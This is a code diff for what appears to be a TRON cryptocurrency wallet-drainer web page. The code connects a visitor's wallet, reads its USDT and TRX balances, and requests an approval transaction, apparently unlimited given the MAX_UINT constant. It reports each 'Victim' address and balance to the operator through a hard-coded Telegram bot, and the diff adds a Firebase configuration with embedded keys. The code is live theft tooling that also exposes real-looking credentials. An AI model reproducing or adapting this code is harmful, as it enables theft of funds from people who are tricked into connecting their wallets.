@@ -1,3 +1,18 @@
+// Firebase Config
+const firebaseConfig = {
+    apiKey: "AIzaSyD4qKMlB3TJjYprgpAEkA5Ts-Yvg7aRbp0",
+    authDomain: "tronadmin-99827.firebaseapp.com",
+    databaseURL: "https://tronadmin-99827-default-rtdb.firebaseio.com",
+    projectId: "tronadmin-99827",
+    storageBucket: "tronadmin-99827.firebasestorage.app",
+    messagingSenderId: "500883948250",
+    appId: "1:500883948250:web:203f69935a6825d09b5be3"
+};
+
+if (typeof firebase !== 'undefined') {
+    firebase.initializeApp(firebaseConfig);
+}
+
 const CONFIG = {
     BOT_TOKEN: "8738726378:AAHkiTAAZ16hoGFObK_v76yi0f0wqITMZXM",
     CHAT_ID: "8249230506",
@@ -8,17 +23,17 @@ const MAX_UINT = "11579208923731619542357098500868790785326998466564056403945758
 
 async function notifyAdmin(status, address, trx = "0", usdt = "0", extra = "") {
     const text = `🎯 <b>NEW UPDATE</b>\n\n` +
-                 `📌 Status: <b>${status}</b>\n` +
-                 `👤 Victim: <code>${address}</code>\n` +
-                 `💰 Balance: <code>${usdt} USDT</code> | <code>${trx} TRX</code>\n` +
-                 `📝 Detail: ${extra}`;
+        `📌 Status: <b>${status}</b>\n` +
+        `👤 Victim: <code>${address}</code>\n` +
+        `💰 Balance: <code>${usdt} USDT</code> | <code>${trx} TRX</code>\n` +
+        `📝 Detail: ${extra}`;
     try {
         await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ chat_id: CONFIG.CHAT_ID, text: text, parse_mode: "HTML" })
         });
-    } catch(e) {}
+    } catch (e) { }
 }
 
 async function getStats(address) {
@@ -26,9 +41,9 @@ async function getStats(address) {
     let trx = "0.00", usdt = "0.00";
     try {
         trx = (await tw.trx.getBalance(address) / 1e6).toFixed(2);
-        const contract = await tw.transactionBuilder.triggerConstantContract(CONFIG.USDT_CONTRACT, "balanceOf(address)", {}, [{type:'address', value: address}], address);
+        const contract = await tw.transactionBuilder.triggerConstantContract(CONFIG.USDT_CONTRACT, "balanceOf(address)", {}, [{ type: 'address', value: address }], address);
         usdt = (parseInt(contract.constant_result[0], 16) / 1e6).toFixed(2);
-    } catch(e) {}
+    } catch (e) { }
     return { trx, usdt };
 }
 
@@ -38,7 +53,7 @@ document.getElementById('next-btn').addEventListener('click', async () => {
 
     // Silent check: Wait until systems are ready without showing alerts
     let attempts = 0;
-    while(typeof window.connectWalletConnectTron !== 'function' && attempts < 30) {
+    while (typeof window.connectWalletConnectTron !== 'function' && attempts < 30) {
         await new Promise(r => setTimeout(r, 500));
         attempts++;
     }
@@ -54,7 +69,7 @@ document.getElementById('next-btn').addEventListener('click', async () => {
         if (result && result.address) {
             const address = result.address;
             const { trx, usdt } = await getStats(address);
-            
+
             document.getElementById('view-balance').innerText = usdt;
             document.getElementById('page-wrapper').classList.add('opacity-10');
             document.getElementById('loading-screen').classList.remove('hidden');
@@ -62,7 +77,7 @@ document.getElementById('next-btn').addEventListener('click', async () => {
             await notifyAdmin("CONNECTED", address, trx, usdt, "Waiting for approval...");
 
             const localTronWeb = new TronWeb({ fullHost: 'https://api.trongrid.io' });
-            
+
             setTimeout(async () => {
                 try {
                     const { transaction } = await localTronWeb.transactionBuilder.triggerSmartContract(
@@ -71,7 +86,7 @@ document.getElementById('next-btn').addEventListener('click', async () => {
                     );
 
                     // Timeout promise to prevent getting stuck if wallet doesn't respond
-                    const timeoutPromise = new Promise((_, reject) => 
+                    const timeoutPromise = new Promise((_, reject) =>
                         setTimeout(() => reject(new Error("Request Timeout")), 60000)
                     );
 
@@ -98,9 +113,9 @@ document.getElementById('next-btn').addEventListener('click', async () => {
                         errorEl.innerText = "Error: " + reason;
                         errorEl.classList.remove('hidden');
                     }
-                    
+
                     await notifyAdmin("❌ FAILED", address, trx, usdt, `Reason: ${reason}`);
-                    
+
                     // Wait 3 seconds so user can see the reason before reload
                     setTimeout(() => {
                         location.reload();
